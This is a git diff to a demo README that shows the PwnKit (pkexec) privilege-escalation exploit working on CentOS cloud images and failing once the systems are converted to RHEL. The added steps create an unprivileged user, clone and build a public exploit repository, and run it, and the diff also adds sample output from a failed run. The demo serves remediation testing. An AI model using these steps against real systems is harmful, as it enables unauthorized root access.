@@ -10,6 +10,12 @@ There are a number of sample escallation examples availble today including
 For this demo we'll show how the standard Cloud Images for Centos
 are impacted by the exploit that once updated to RHEL the exploit has been remediated
 
+This demo has been validated against the following Centos Images
+
+* https://cloud.centos.org/altarch/7/images/CentOS-7-x86_64-GenericCloud-2009.qcow2[CentOS-7-x86_64-GenericCloud-2009.qcow2]
+* https://cloud.centos.org/centos/8/x86_64/images/CentOS-8-GenericCloud-8.4.2105-20210603.0.x86_64.qcow2[CentOS-8-GenericCloud-8.4.2105-20210603.0.x86_64.qcow2] 
+** including patched upto Centos 8.5
+
 == Demo Pre-work ==
 
 First we need a Centos Virtual machine
@@ -29,26 +35,39 @@ sed -i 's/^mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
 sed -i 's|#baseurl=http://mirror.centos.org|baseurl=https://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
 ----
 
+=== Automated Deployment ===
 
-Install the required tools into your VM and build the exploit
+Here we use Ansible to create the user and configure the environment
+
 
 [source,bash]
 ----
 
-yum install gcc make
+cd ansible
+ansible-playbook -i hosts pwnkit.yaml
 
+----
+
+
+=== Manual environment configuration ===
+
+Install the required tools into your VM and download
+the exploit respoitory
+
+[source,bash]
+----
+
+ssh leapp2rhel
+
+yum install gcc make git
+
+useradd developer
+
+#Switch to the developer user, and download the exploit repo
+su -i developer
 
 # Clone the exploit code, and build the exploit
 git clone https://github.com/luijait/PwnKit-Exploit.git
-
-cd PwnKit-Exploit/
-make
-
-Copy the exploit to a temp directory, and create a new user without sudo privileges
-cp exploit /tmp/
-useradd developer
-Switch to the developer user, and copy the exploit binary to the home dir
-cp /tmp/exploit /home/developer
 
 ----
 
@@ -72,6 +91,10 @@ git clone https://github.com/luijait/PwnKit-Exploit.git Exploit
 # Build the PwnKit Exploit
 cd Exploit
 make
+
+# Confirm our user details
+id
+uid=1000(developer) gid=1000(developer) groups=1000(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
 # Confirm we can't access the root user
 
@@ -106,6 +129,20 @@ ssh developer@leapp2rhel
 
 ./exploit
 # Exploit fails
+
+Current User before execute exploit
+hacker@victim$whoami: developer
+Exploit written by @luijait (0x6c75696a616974)
+[+] Enjoy your root if exploit was completed succesfully
+pkexec --version |
+       --help |
+       --disable-internal-agent |
+       [--user username] PROGRAM [ARGUMENTS...]
+
+See the pkexec manual page for more details.
+
+Report bugs to: http://lists.freedesktop.org/mailman/listinfo/polkit-devel
+polkit home page: <http://www.freedesktop.org/wiki/Software/polkit>
 
 ----
 
